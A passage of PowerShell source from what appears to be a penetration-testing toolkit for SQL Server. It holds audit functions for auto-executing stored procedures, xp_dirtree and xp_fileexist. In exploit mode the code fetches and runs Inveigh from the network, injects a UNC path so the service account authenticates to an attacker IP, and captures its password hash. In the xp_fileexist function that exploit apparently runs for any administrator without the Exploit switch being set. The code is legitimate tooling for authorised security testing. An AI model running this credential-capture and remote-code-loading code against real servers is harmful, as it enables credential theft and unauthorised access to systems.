        $TblAutoExecPrivs.Columns.add('PermissionType') | Out-Null
        $TblAutoExecPrivs.Columns.add('StateDescription') | Out-Null
        $TblAutoExecPrivs.Columns.add('ObjectName') | Out-Null
        $TblAutoExecPrivs.Columns.add('ObjectType') | Out-Null

        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Auto Execute Stored Procedure."
            Return
        }

        # Grab server information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $CurrentLogin = $ServerInfo.CurrentLogin
        $ComputerName = $ServerInfo.ComputerName

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Auto Execute Stored Procedure'
        $Description   = 'A stored procedured is configured for automatic execution and has explicit permissions assigned.  This may allow non sysadmin logins to execute queries as "sa" when the SQL Server service is restarted.'
        $Remediation   = "Ensure that non sysadmin logins do not have privileges to ALTER stored procedures configured with the is_auto_executed settting set to 1."
        $Severity      = 'Low'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'There is not exploit available at this time.'
        $Details       = ''
        $Reference     = 'https://msdn.microsoft.com/en-us/library/ms187861.aspx'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------
        $IsVulnerable  = 'Yes'

        # Get list of autoexec stored procedures
        $AutoProcs = Get-SQLStoredProcedureAutoExec -Verbose -Instance $Instance -Username $username -Password $password -Credential $credential 

        # Get count
        $AutoCount = $AutoProcs | measure | select count -ExpandProperty count

        if($AutoCount -eq 0){
            Write-Verbose "$Instance : No stored procedures were found configured to auto execute."
            return
        }

        # Get permissions for procs
        Write-Verbose "$Instance : Checking permissions..."
        $AutoProcs | 
        foreach-object {
    
            # Grab autoexec proc info
            $ComputerName = $_.ComputerName
            $Instance = $_.Instance
            $DatabaseName = $_.DatabaseName
            $SchemaName = $_.SchemaName
            $ProcedureName = $_.ProcedureName
            $ProcedureType = $_.ProcedureType
            $ProcedureDefinition = $_.ProcedureDefinition
            $SQL_DATA_ACCESS = $_.SQL_DATA_ACCESS
            $ROUTINE_BODY = $_.ROUTINE_BODY
            $CREATED = $_.CREATED
            $LAST_ALTERED = $_.LAST_ALTERED
            $is_ms_shipped = $_.is_ms_shipped
            $is_auto_executed = $_.is_auto_executed    

            # Get a list of explicit permissions 
	        $Results = Get-SQLDatabasePriv -Verbose -DatabaseName master -SuppressVerbose -Instance $Instance -Username $username -Password $password -Credential $credential | 
            Where-Object {$_.objectname -like "$ProcedureName"}

            # Check if any permisssions exist
            $PermCount = $Results | measure | select count -ExpandProperty count

            # Add record
            if($PermCount -ge 1){

                # Itererate through each permission
                $Results | 
                ForEach-Object {

                    # Grab permission info
                    $PrincipalName = $_.PrincipalName
                    $PrincipalType = $_.PrincipalType
                    $PermissionName = $_.PermissionName
                    $PermissionType = $_.PermissionType
                    $StateDescription = $_.StateDescription
                    $ObjectType = $_.ObjectType
                    $ObjectName = $_.ObjectName

                    $FullSpName = "$DatabaseName.$SchemaName.$ProcedureName"
        
                    # Add row to results
                    $TblAutoExecPrivs.Rows.Add(
                        $ComputerName,
                        $Instance,
                        $DatabaseName,
                        $SchemaName,
                        $ProcedureName,
                        $ProcedureType,
                        $ProcedureDefinition,
                        $SQL_DATA_ACCESS,
                        $ROUTINE_BODY,
                        $CREATED,
                        $LAST_ALTERED,
                        $is_ms_shipped,
                        $is_auto_executed,
                        $PrincipalName,
                        $PrincipalType,
                        $PermissionName,
                        $PermissionType,
                        $StateDescription,
                        $ObjectName,
                        $ObjectType
                    ) | Out-Null

                    Write-Verbose -Message "$Instance : - $PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $Details = "$PrincipalName has $StateDescription $PermissionName on $FullSpName."
                    $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)            
                }
            }
        }

        #$TblAutoExecPrivs       

        # -----------------------------------------------------------------
        # Check for exploit dependancies
        # Note: Typically secondary configs required for dba/os execution
        # -----------------------------------------------------------------
        # $IsExploitable = "No" or $IsExploitable = "Yes"
        # Check if the link is alive and verify connection + check if sysadmin
        $IsExploitable = "Unknown"

        # -----------------------------------------------------------------
        # Exploit Vulnerability
        # Note: Add the current user to sysadmin fixed server role
        # -----------------------------------------------------------------
        # $Exploited = "No" or $Exploited     = "Yes"
        # select * from openquery("server\intance",'EXEC xp_cmdshell whoami WITH RESULT SETS ((output VARCHAR(MAX)))')
        # Also, recommend link crawler module


        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - Trusted Database"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivXpDirtree
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivXpDirtree
{
    <#
            .SYNOPSIS
            Check if the current user has privileges to execute xp_dirtree extended stored procedure.
            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
            the SQL Server service account password hash using Inveigh.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .PARAMETER AttackerIp
            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
            .PARAMETER TimeOut
            Number of seconds to wait for authentication from target SQL Server.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivXpDirtree -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2

            ComputerName  : SQLServer1
            Instance      : SQLServer1\STANDARDDEV2014
            Vulnerability : Excessive Privilege - Execute xp_dirtree
            Description   : xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force
            the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized
            access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats
            because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.
            Remediation   : Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public
            Severity      : Medium
            IsVulnerable  : Yes
            IsExploitable : Yes
            Exploited     : Yes
            ExploitCmd    : Crack the password hash offline or relay it to another system.
            Details       : The public principal has EXECUTE privileges on XP_DIRTREE procedure in the master database. Recovered password hash! Hash type =
            NetNTLMv1;Hash = SQLSvcAcnt::Domain:0000000000000000400000000000000000000000000000000:1CEC319E75261CEC319E759E7511E1CEC319E753AB7D:
            Reference     : https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/
            Author        : Scott Sutherland (@_nullbind), NetSPI 2016

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpDirtree -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_dirtree"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_dirtree."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Execute xp_dirtree'
        $Description   = 'xp_dirtree is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $Remediation   = 'Remove EXECUTE privileges on the XP_DIRTREE procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_dirtree to Public'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get users and roles that execute xp_dirtree
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_dirtree' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Update vulnerable status
        if($DirTreePrivs)
        {
            # Status user
            Write-Verbose -Message "$Instance : - At least one principal has EXECUTE privileges on xp_dirtree."

            $IsVulnerable  = 'Yes'

            if($Exploit){
                # Check if the current process has elevated privs
                # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
                $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                $IsAdmin = $prp.IsInRole($adm)
            
                if(-not $IsAdmin)
                {
                    Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                    $IAMADMIN = 'No'
                }else{
                    Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                    $IAMADMIN = 'Yes'
                }
            }
            
            $DirTreePrivs |
            ForEach-Object -Process {
                $PrincipalName = $DirTreePrivs.PrincipalName

                # Check if current login can exploit
                $CurrentPrincpalList |
                ForEach-Object -Process {
                    $PrincipalCheck = $_

                    if($PrincipalName -eq $PrincipalCheck -or $PrincipalName -eq 'public')
                    {
                        $IsExploitable  = 'Yes'                      

                        # Check for exploit flag
                        if(($IAMADMIN -eq 'Yes') -and ($Exploit))
                        {
                            # Attempt to load Inveigh from file
                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue | Out-Null
                            #Invoke-Expression($InveighSrc)

                            # Get IP of current system
                            if(-not $AttackerIp)
                            {
                                $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                                    Select-Object -ExpandProperty Ipv4Address |
                                Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                                if($AttackerIp -eq '127.0.0.1')
                                {
                                    $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                    Select-Object -First 1 -Property @{
                                        Name       = 'IPAddress'
                                        Expression = {
                                            [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
                                        }
                                    } |
                                    Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                                }
                            }

                            # Attempt to load Inveigh via reflection
                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')

                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Get IP of SQL Server instance
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)

                                # Start sniffing for hashes from that IP
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp

                                # Randomized 5 character file name
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Sent unc path to attacker's Ip
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_dirtree '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose

								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                Start-Sleep -s $TimeOut
                                
                                # Stop sniffing and print password hashes
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                if($PassCleartext)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $PassCleartext
                                }

                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                if($PassNetNTLMv1)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $PassNetNTLMv1
                                }

                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                if($PassNetNTLMv2)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $PassNetNTLMv2
                                }

                                if($Hash)
                                {
                                    # Update Status
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = 'Yes'

                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Update Status
                                    $Exploited = 'No'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database.  xp_dirtree Executed, but no password hash was recovered."
                                }

                                # Clear inveigh cache
                                $null = Clear-Inveigh
                            }
                            else
                            {
                                Write-Verbose -Message "$Instance : - Inveigh could not be loaded."
                                # Update status
                                $Exploited = 'No'
                                $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database, but Inveigh could not be loaded so no password hashes could be recovered."
                            }
                        }
                        else
                        {
                            # Update status
                            $Exploited = 'No'
                            $Details = "The $PrincipalName principal has EXECUTE privileges on the xp_dirtree procedure in the master database."
                        }
                    }
                    else
                    {
                        # Update status
                        $IsExploitable  = 'No'
                        $Details = "The $PrincipalName principal has EXECUTE privileges the xp_dirtree procedure in the master database."
                    }
                }

                # Add record
                $null = $TblData.Rows.Add($ComputerName, $Instance, $Vulnerability, $Description, $Remediation, $Severity, $IsVulnerable, $IsExploitable, $Exploited, $ExploitCmd, $Details, $Reference, $Author)
            }
        }
        else
        {
            Write-Verbose -Message "$Instance : - No logins were found with the EXECUTE privilege on xp_dirtree."
        }

        # Status User
        Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - XP_DIRTREE"
    }

    End
    {
        # Return data
        if ( -not $NoOutput)
        {
            Return $TblData
        }
    }
}


# ---------------------------------------
# Invoke-SQLAuditPrivXpFileexist
# ---------------------------------------
# Author: Scott Sutherland
Function Invoke-SQLAuditPrivXpFileexist
{
    <#
            .SYNOPSIS
            Check if the current user has privileges to execute xp_fileexist extended stored procedure.
            If exploit option is used, the script will inject a UNC path to the attacker's IP and capture
            the SQL Server service account password hash using Inveigh.
            .PARAMETER Username
            SQL Server or domain account to authenticate with.
            .PARAMETER Password
            SQL Server or domain account password to authenticate with.
            .PARAMETER Credential
            SQL Server credential.
            .PARAMETER Instance
            SQL Server instance to connection to.
            .PARAMETER Exploit
            Exploit vulnerable issues.
            .PARAMETER AttackerIp
            IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.
            .PARAMETER TimeOut
            Number of seconds to wait for authentication from target SQL Server.
            .EXAMPLE
            PS C:\> Invoke-SQLAuditPrivXpFileexist -Verbose -Instance SQLServer1\STANDARDDEV2014 -AttackerIp 10.1.1.2

            .EXAMPLE
            PS C:\> Get-SQLInstanceDomain -Verbose | Invoke-SQLAuditPrivXpFileexist -Verbose
    #>
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = "Don't output anything.")]
        [string]$NoOutput,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Exploit vulnerable issues.')]
        [switch]$Exploit,

        [Parameter(Mandatory = $false,
        HelpMessage = 'IP that the SQL Server service will attempt to authenticate to, and password hashes will be captured from.')]
        [string]$AttackerIp,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Time in second to way for hash to be captured.')]
        [int]$TimeOut = 5
    )

    Begin
    {
        # Table for output
        $TblData = New-Object -TypeName System.Data.DataTable
        $null = $TblData.Columns.Add('ComputerName')
        $null = $TblData.Columns.Add('Instance')
        $null = $TblData.Columns.Add('Vulnerability')
        $null = $TblData.Columns.Add('Description')
        $null = $TblData.Columns.Add('Remediation')
        $null = $TblData.Columns.Add('Severity')
        $null = $TblData.Columns.Add('IsVulnerable')
        $null = $TblData.Columns.Add('IsExploitable')
        $null = $TblData.Columns.Add('Exploited')
        $null = $TblData.Columns.Add('ExploitCmd')
        $null = $TblData.Columns.Add('Details')
        $null = $TblData.Columns.Add('Reference')
        $null = $TblData.Columns.Add('Author')
    }

    Process
    {
        # Status User
        Write-Verbose -Message "$Instance : START VULNERABILITY CHECK: Excessive Privilege - xp_fileexist"

        # Test connection to server
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if(-not $TestConnection)
        {
            # Status user
            Write-Verbose -Message "$Instance : CONNECTION FAILED."
            Write-Verbose -Message "$Instance : COMPLETED VULNERABILITY CHECK: Excessive Privilege - xp_fileexist."
            Return
        }
        else
        {
            Write-Verbose -Message "$Instance : CONNECTION SUCCESS."
        }

        # Grab server information
        # Grab server, login, and role information
        $ServerInfo = Get-SQLServerInfo -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose
        $ComputerName = $ServerInfo.ComputerName
        $CurrentLogin = $ServerInfo.CurrentLogin
        $CurrentLoginRoles = Get-SQLServerRoleMember -Instance $Instance -Username $Username -Password $Password -Credential $Credential -PrincipalName $CurrentLogin  -SuppressVerbose
        $CurrentPrincpalList = @()
        $CurrentPrincpalList += $CurrentLogin
        $CurrentPrincpalList += 'Public'
        $CurrentLoginRoles | ForEach-Object -Process {
            $CurrentPrincpalList += $_.RolePrincipalName
        }

        # --------------------------------------------
        # Set function meta data for report output
        # --------------------------------------------
        if($Exploit)
        {
            $TestMode  = 'Exploit'
        }
        else
        {
            $TestMode  = 'Audit'
        }
        $Vulnerability = 'Excessive Privilege - Execute xp_fileexist'
        $Description   = 'xp_fileexist is a native extended stored procedure that can be executed by members of the Public role by default in SQL Server 2000-2014. Xp_dirtree can be used to force the SQL Server service account to authenticate to a remote attacker.  The service account password hash can then be captured + cracked or relayed to gain unauthorized access to systems. This also means xp_dirtree can be used to escalate a lower privileged user to sysadmin when a machine or managed account isnt being used.  Thats because the SQL Server service account is a member of the sysadmin role in SQL Server 2000-2014, by default.'
        $Remediation   = 'Remove EXECUTE privileges on the xp_fileexist procedure for non administrative logins and roles.  Example command: REVOKE EXECUTE ON xp_fileexist to Public'
        $Severity      = 'Medium'
        $IsVulnerable  = 'No'
        $IsExploitable = 'No'
        $Exploited     = 'No'
        $ExploitCmd    = 'Crack the password hash offline or relay it to another system.'
        $Details       = ''
        $Reference     = 'https://blog.netspi.com/executing-smb-relay-attacks-via-sql-server-using-metasploit/'
        $Author        = 'Scott Sutherland (@_nullbind), NetSPI 2016'

        # -----------------------------------------------------------------
        # Check for the Vulnerability
        # Note: Typically a missing patch or weak configuration
        # -----------------------------------------------------------------

        # Get users and roles that execute xp_fileexist
        $DirTreePrivs = Get-SQLDatabasePriv -Instance $Instance -Username $Username -Password $Password -Credential $Credential -DatabaseName master -SuppressVerbose | Where-Object -FilterScript {
            $_.ObjectName -eq 'xp_fileexist' -and $_.PermissionName -eq 'EXECUTE' -and $_.statedescription -eq 'grant'
        }

        # Update vulnerable status
        if($DirTreePrivs)
        {
            # Status user
            Write-Verbose -Message "$Instance : - The $PrincipalName principal has EXECUTE privileges on xp_fileexist."

            $IsVulnerable  = 'Yes'
            $DirTreePrivs |
            ForEach-Object {
                $PrincipalName = $DirTreePrivs.PrincipalName

                # Check if current login can exploit
                $CurrentPrincpalList |
                ForEach-Object {
                    $PrincipalCheck = $_

                    if($PrincipalName -eq $PrincipalCheck)
                    {
                        $IsExploitable  = 'Yes'

                        # Check if the current process has elevated privs
                        # https://msdn.microsoft.com/en-us/library/system.security.principal.windowsprincipal(v=vs.110).aspx
                        $CurrentIdentity = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                        $prp = New-Object -TypeName System.Security.Principal.WindowsPrincipal -ArgumentList ($CurrentIdentity)
                        $adm = [System.Security.Principal.WindowsBuiltInRole]::Administrator
                        $IsAdmin = $prp.IsInRole($adm)
                        if (-not $IsAdmin)
                        {
                            Write-Verbose -Message "$Instance : - You do not have Administrator rights. Run this function as an Administrator in order to load Inveigh."
                            $IAMADMIN = 'No'
                        }
                        else
                        {
                            Write-Verbose -Message "$Instance : - You have Administrator rights. Inveigh will be loaded."
                            $IAMADMIN = 'Yes'
                        }

                        # Get IP of current system
                        if(-not $AttackerIp)
                        {
                            $AttackerIp = (Test-Connection -ComputerName 127.0.0.1 -Count 1 |
                            Select-Object -ExpandProperty Ipv4Address |
                            Select-Object -Property IPAddressToString -ExpandProperty IPAddressToString)

                            if($AttackerIp -eq '127.0.0.1')
                            {
                                $AttackerIp = Get-WmiObject -Class win32_networkadapterconfiguration -Filter "ipenabled = 'True'" -ComputerName $env:COMPUTERNAME |
                                Select-Object -First 1 -Property @{
                                    Name       = 'IPAddress'
                                    Expression = {
                                        [regex]$rx = '(\d{1,3}(\.?)){4}'; $rx.matches($_.IPAddress)[0].Value
                                    }
                                } |
                                Select-Object -Property IPaddress -ExpandProperty IPAddress -First 1
                            }
                        }

                        # Check for exploit flag
                        if($IAMADMIN -eq 'Yes')
                        {
                            # Attempt to load Inveigh from file
                            #$InveighSrc = Get-Content .\scripts\Inveigh.ps1 -ErrorAction SilentlyContinue
                            #Invoke-Expression($InveighSrc)

                            # Attempt to load Inveigh via reflection
                            Invoke-Expression -Command (New-Object -TypeName system.net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Scripts/Inveigh.ps1')

                            $TestIt = Test-Path -Path Function:\Invoke-Inveigh
                            if($TestIt -eq 'True')
                            {
                                Write-Verbose -Message "$Instance : - Inveigh loaded."

                                # Get IP of SQL Server instance
                                $InstanceIP = [System.Net.Dns]::GetHostAddresses($ComputerName)

                                # Start sniffing for hashes from that IP
                                Write-Verbose -Message "$Instance : - Start sniffing..."
                                $null = Invoke-Inveigh -HTTP N -NBNS Y -MachineAccounts Y -WarningAction SilentlyContinue -IP $AttackerIp

                                # Randomized 5 character file name
                                $path = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))

                                # Sent unc path to attacker's Ip
                                Write-Verbose -Message "$Instance : - Inject UNC path to \\$AttackerIp\$path..."
                                $null = Get-SQLQuery -Instance $Instance -Username $Username -Password $Password -Credential $Credential -Query "xp_fileexist '\\$AttackerIp\$path'" -TimeOut 10 -SuppressVerbose

								# Sleep for $Timeout seconds to ensure that slow connections make it back to the listener
								Write-Verbose -Message "$Instance : - Sleeping for $TimeOut seconds to ensure the hash comes back"
                                Start-Sleep -s $TimeOut

                                # Stop sniffing and print password hashes
                                $null = Stop-Inveigh
                                Write-Verbose -Message "$Instance : - Stopped sniffing."

                                $HashType = ''
                                $Hash = ''

                                [string]$PassCleartext = Get-Inveigh -Cleartext Y
                                if($PassCleartext)
                                {
                                    $HashType = 'Cleartext'
                                    $Hash = $PassCleartext
                                }

                                [string]$PassNetNTLMv1 = Get-Inveigh -NTLMv1 Y
                                if($PassNetNTLMv1)
                                {
                                    $HashType = 'NetNTLMv1'
                                    $Hash = $PassNetNTLMv1
                                }

                                [string]$PassNetNTLMv2 = Get-Inveigh -NTLMv2 Y
                                if($PassNetNTLMv2)
                                {
                                    $HashType = 'NetNTLMv2'
                                    $Hash = $PassNetNTLMv2
                                }

                                if($Hash)
                                {
                                    # Update Status
                                    Write-Verbose -Message "$Instance : - Recovered $HashType hash:"
                                    Write-Verbose -Message "$Instance : - $Hash"
                                    $Exploited = 'Yes'
                                    $Details = "The $PrincipalName principal has EXECUTE privileges on xp_fileexist procedure in the master database. Recovered password hash! Hash type = $HashType;Hash = $Hash"
                                }
                                else
                                {
                                    # Update Status
                                    $Exploited = 'No'
